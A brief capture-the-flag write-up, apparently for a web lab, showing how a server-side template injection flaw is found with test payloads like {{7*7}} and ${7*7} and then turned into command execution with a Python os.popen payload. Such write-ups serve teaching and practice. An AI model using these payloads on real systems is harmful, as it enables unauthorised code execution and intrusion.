Boot up the instance and experiment around.

Payload:
```html
<h1>hello</h1>
```

![image](./img/Screenshot%202025-06-20%20213732.png)

This is vulnerable to 'Server Side Template Injection(SSTI)'

Trying with ``{{7*7}}`` payload.

![image](./img/Screenshot%202025-06-20%20214043.png)

Intresting, trying another payload ``${7*7}``

![image](./img/Screenshot%202025-06-20%20214157.png)

Intresting, we figure out that it's running python on the backend from this excellent resource (https://github.com/swisskyrepo/PayloadsAllTheThings)

Let's try out injecting commands:

Payload:
```python
${__import__('os').popen('whoami').read()}
```

![image](./img/Screenshot%202025-06-20%20214609.png)

Now navigate to the flag and print it out, challenge solved.